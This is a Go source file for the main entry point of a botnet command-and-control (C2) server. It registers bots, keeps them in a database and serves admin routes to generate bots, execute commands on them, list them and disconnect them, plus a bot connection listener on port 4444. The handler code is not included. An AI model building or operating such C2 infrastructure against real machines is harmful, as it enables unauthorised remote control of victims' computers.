package main

import (
	database "c2/server/db"
	"c2/server/models"
	"fmt"
	"log"
	"net"
	"net/http"
	"sync"
)

type PendingBots struct {
	Conn net.Conn
}

type c2 struct {
	Mu      sync.RWMutex
	Bots    map[string]*models.Bot
	Pending map[string]*PendingBots
	Db      *database.Db
}

func Newc2() *c2 {
	return &c2{
		Bots: make(map[string]*models.Bot),
	}
}

func (c *c2) RegisterBot(id string, b *models.Bot) {
	c.Mu.Lock()
	defer c.Mu.Unlock()

	c.Bots[id] = b
}

func (c *c2) GetBot(id string) *models.Bot {
	c.Mu.RLock()
	defer c.Mu.RUnlock()
	return c.Bots[id]

}

func (c *c2) RegisterBots() {

}

func main() {
	fmt.Println("Started C2....")
	db := database.NewDbConnection()
	if err := db.CreateTable(); err != nil {
		log.Fatal("Failed to execute query: ", err)
	}

	var wg sync.WaitGroup
	wg.Add(2)
	c2 := Newc2()
	c2.Db = db

	adminMux := http.NewServeMux()
	// adminMux.HandleFunc("/", nil)
	adminMux.HandleFunc("/generatebot", c2.GenerateBot)
	adminMux.HandleFunc("/executeCommand/{botid}/", c2.SendCommand)
	adminMux.HandleFunc("/listBots", c2.ListBots)
	adminMux.HandleFunc("/disconnect/{botid}/", func(w http.ResponseWriter, r *http.Request) {
		botID := r.PathValue("botid")

		if exist := c2.DisconnectBot(botID); !exist {
			log.Println("Bot with id : ", botID, " Does not exist.")
			return
		}
	})

	botMux := http.NewServeMux()
	botMux.HandleFunc("/connect", c2.connectBot)

	go func() {
		defer wg.Done()
		if err := http.ListenAndServe("127.0.0.1:9000", adminMux); err != nil {
			log.Println("Admin Server Error : ", err)
		}
	}()

	go func() {
		defer wg.Done()
		if err := http.ListenAndServe("127.0.0.1:4444", botMux); err != nil {
			log.Println("Bot Server Error : ", err)
		}
	}()

	wg.Wait()

}
